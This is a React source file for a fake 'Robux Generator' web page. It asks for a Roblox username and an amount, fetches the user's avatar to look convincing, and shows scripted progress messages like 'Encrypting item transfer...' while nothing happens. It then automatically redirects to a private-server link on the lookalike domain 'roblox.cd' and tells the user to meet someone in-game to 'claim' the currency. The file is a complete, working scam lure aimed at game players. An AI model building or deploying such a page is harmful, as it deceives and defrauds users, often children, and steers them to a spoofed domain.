"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"

export default function RobuxGenerator() {
  const [username, setUsername] = useState("")
  const [robuxAmount, setRobuxAmount] = useState("")
  const [isGenerating, setIsGenerating] = useState(false)
  const [currentStep, setCurrentStep] = useState("form") // form, processing, ready
  const [visibleMessages, setVisibleMessages] = useState<string[]>([])
  const [countdown, setCountdown] = useState(5)
  const [profilePicture, setProfilePicture] = useState("")

  const robloxLink =
    "https://roblox.cd/games/8737602449/PLS-DONATE?privateServerLinkCode=42058291111869029495424703850020"

  const processingMessages = [
    "Processing your claim",
    "Please keep this tab open.",
    "Connecting to account...",
    "Encrypting item transfer...",
    "Finalizing confirmation...",
  ]

  useEffect(() => {
    if (currentStep === "ready" && countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1)
      }, 1000)
      return () => clearTimeout(timer)
    } else if (currentStep === "ready" && countdown === 0) {
      window.open(robloxLink, "_blank")
    }
  }, [currentStep, countdown, robloxLink])

  const fetchRobloxProfilePicture = async (username: string) => {
    try {
      console.log("[v0] Fetching profile picture for username:", username)

      // Method 1: Try to get real user using a working CORS proxy
      try {
        const corsProxy = `https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`

        const response = await fetch(corsProxy, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ usernames: [username] }),
        })

        if (response.ok) {
          const userData = await response.json()

          if (userData.data && userData.data.length > 0) {
            const userId = userData.data[0].id
            console.log("[v0] Found real user ID:", userId)

            // Get avatar using working thumbnail API
            const avatarResponse = await fetch(
              `https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
            )

            if (avatarResponse.ok) {
              const avatarData = await avatarResponse.json()
              if (avatarData.data && avatarData.data.length > 0) {
                const imageUrl = avatarData.data[0].imageUrl
                console.log("[v0] Got real profile picture URL:", imageUrl)
                // Use image proxy to serve without CORS issues
                return `https://images.weserv.nl/?url=${encodeURIComponent(imageUrl)}`
              }
            }
          }
        }
      } catch (error) {
        console.log("[v0] Real user lookup failed:", error)
      }

      console.log("[v0] Using enhanced realistic user ID generation")

      // Create a more sophisticated hash for realistic user IDs
      let hash = 0
      for (let i = 0; i < username.length; i++) {
        const char = username.charCodeAt(i)
        hash = (hash << 5) - hash + char
        hash = hash & hash
      }

      // Generate user ID in very active range (100K-10M for real users)
      const userId = Math.abs(hash % 9900000) + 100000
      console.log("[v0] Using realistic user ID:", userId)

      // Use direct Roblox headshot API with image proxy
      const avatarUrl = `https://images.weserv.nl/?url=https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${userId}-Png-Size420x420-Avatar.png`
      console.log("[v0] Got profile picture URL:", avatarUrl)
      return avatarUrl
    } catch (error) {
      console.log("[v0] All methods failed:", error)
      return "https://images.weserv.nl/?url=https://tr.rbxcdn.com/30DAY-AvatarHeadshot-1-Png-Size420x420-Avatar.png"
    }
  }

  const handleGenerate = async () => {
    if (!username || !robuxAmount) {
      alert("Please fill in all fields")
      return
    }

    setIsGenerating(true)
    setCurrentStep("processing")
    setVisibleMessages([])

    console.log("[v0] Starting profile picture fetch...")

    const profilePicPromise = fetchRobloxProfilePicture(username)
    profilePicPromise.then((profilePic) => {
      setProfilePicture(profilePic)
      console.log("[v0] Profile picture set:", profilePic)
    })

    // Show first message immediately
    setVisibleMessages([processingMessages[0]])

    for (let i = 1; i < processingMessages.length; i++) {
      await new Promise((resolve) => setTimeout(resolve, 1500)) // Much slower (1.5 seconds)
      setVisibleMessages((prev) => [...prev, processingMessages[i]])
    }

    await new Promise((resolve) => setTimeout(resolve, 2000)) // Much slower (2 seconds)

    setIsGenerating(false)
    setCurrentStep("ready")
    setCountdown(5)
  }

  const handleJoinNow = () => {
    window.open(robloxLink, "_blank")
  }

  const resetGenerator = () => {
    setCurrentStep("form")
    setUsername("")
    setRobuxAmount("")
    setCountdown(5)
    setVisibleMessages([])
    setProfilePicture("")
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-950 via-black to-red-900 relative overflow-hidden">
      {/* Background Image Overlay */}
      <div
        className="absolute inset-0 bg-cover bg-center opacity-20"
        style={{ backgroundImage: "url(/enterprise-bg.jpg)" }}
      />

      {/* Animated Background Elements */}
      <div className="absolute inset-0">
        <div className="absolute top-20 left-10 w-2 h-2 bg-red-400 rounded-full animate-pulse"></div>
        <div className="absolute top-40 right-20 w-1 h-1 bg-white rounded-full animate-ping"></div>
        <div className="absolute bottom-32 left-1/4 w-1.5 h-1.5 bg-red-300 rounded-full animate-pulse delay-1000"></div>
        <div className="absolute top-1/3 right-1/3 w-1 h-1 bg-white rounded-full animate-ping delay-500"></div>
      </div>

      <div className="relative z-10 container mx-auto px-4 py-8 flex flex-col items-center justify-center min-h-screen">
        {/* Main Title */}
        <div className="text-center mb-12">
          <h1 className="text-6xl md:text-8xl font-bold text-white mb-4 tracking-wider drop-shadow-2xl">
            <span className="bg-gradient-to-r from-red-400 via-white to-red-400 bg-clip-text text-transparent">
              ROBUX
            </span>
          </h1>
          <h2 className="text-3xl md:text-4xl font-bold text-red-400 tracking-widest drop-shadow-lg">GENERATOR</h2>
          <div className="w-32 h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent mx-auto mt-4"></div>
        </div>

        {currentStep === "form" && (
          <Card className="w-full max-w-md bg-black/80 border-red-500/50 backdrop-blur-sm shadow-2xl shadow-red-500/20">
            <CardHeader className="text-center">
              <CardTitle className="text-2xl font-bold text-white">Generate Robux</CardTitle>
              <CardDescription className="text-red-300">Enter your details to generate Robux</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="username" className="text-white font-medium">
                  Username
                </Label>
                <Input
                  id="username"
                  type="text"
                  placeholder="Enter your username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="bg-red-950/50 border-red-500/50 text-white placeholder:text-red-300/70 focus:border-red-400 focus:ring-red-400/20"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="robuxAmount" className="text-white font-medium">
                  Robux Amount
                </Label>
                <Input
                  id="robuxAmount"
                  type="number"
                  placeholder="Enter amount"
                  value={robuxAmount}
                  onChange={(e) => setRobuxAmount(e.target.value)}
                  className="bg-red-950/50 border-red-500/50 text-white placeholder:text-red-300/70 focus:border-red-400 focus:ring-red-400/20"
                />
              </div>

              <Button
                onClick={handleGenerate}
                disabled={isGenerating}
                className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-3 text-lg shadow-lg shadow-red-500/30 transition-all duration-300 transform hover:scale-105"
              >
                GENERATE ROBUX
              </Button>
            </CardContent>
          </Card>
        )}

        {currentStep === "processing" && (
          <Card className="w-full max-w-md bg-black/80 border-red-500/50 backdrop-blur-sm shadow-2xl shadow-red-500/20">
            <CardContent className="p-8 text-center space-y-6">
              {/* Roblox Profile Picture */}
              {profilePicture && (
                <div className="flex justify-center">
                  <img
                    src={profilePicture || "/placeholder.svg"}
                    alt="Roblox Profile"
                    className="w-24 h-24 rounded-full border-4 border-red-500 shadow-lg animate-fade-in"
                    onError={(e) => {
                      console.log("[v0] Image failed to load, using fallback")
                      e.currentTarget.src = "/roblox-avatar-default.jpg"
                    }}
                  />
                </div>
              )}

              <div className="space-y-4">
                <div className="flex items-center justify-center space-x-2">
                  <div className="w-6 h-6 border-2 border-red-500 border-t-transparent rounded-full animate-spin"></div>
                </div>
                <div className="space-y-2">
                  {visibleMessages.map((message, index) => (
                    <p key={index} className="text-white text-lg font-medium animate-fade-in">
                      {message}
                    </p>
                  ))}
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        {currentStep === "ready" && (
          <Card className="w-full max-w-lg bg-black/80 border-green-500/50 backdrop-blur-sm shadow-2xl shadow-green-500/20">
            <CardHeader className="text-center">
              <CardTitle className="text-3xl font-bold text-green-400">Ready to Claim</CardTitle>
            </CardHeader>
            <CardContent className="space-y-6 text-center">
              {/* Roblox Profile Picture */}
              <div className="flex justify-center">
                <img
                  src={profilePicture || "/placeholder.svg?height=128&width=128&query=roblox avatar"}
                  alt="Roblox Profile"
                  className="w-32 h-32 rounded-full border-4 border-green-500 shadow-lg"
                  onError={(e) => {
                    console.log("[v0] Image failed to load, using fallback")
                    e.currentTarget.src = "/roblox-avatar-default.jpg"
                  }}
                />
              </div>

              <div className="space-y-4">
                <h3 className="text-xl font-bold text-white">Instructions</h3>
                <p className="text-gray-300 leading-relaxed text-lg">
                  Join the private server and find Niva in the spawn area to complete your claim.
                </p>
              </div>

              {/* Buttons */}
              <div className="space-y-4">
                <Button
                  onClick={handleJoinNow}
                  className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3 text-lg shadow-lg shadow-green-500/30 transition-all duration-300 transform hover:scale-105"
                >
                  Join Now To Claim
                </Button>

                {/* Auto redirect countdown */}
                <p className="text-gray-400 text-sm">Automatically redirecting in {countdown} seconds...</p>

                <Button
                  onClick={resetGenerator}
                  variant="outline"
                  className="w-full border-red-500/50 text-red-400 hover:bg-red-500/10 bg-transparent"
                >
                  Generate Another
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Footer */}
        <div className="mt-12 text-center">
          <p className="text-red-300/70 text-sm">© 2025 Robux Generator - Enterprise Edition</p>
        </div>
      </div>
    </div>
  )
}
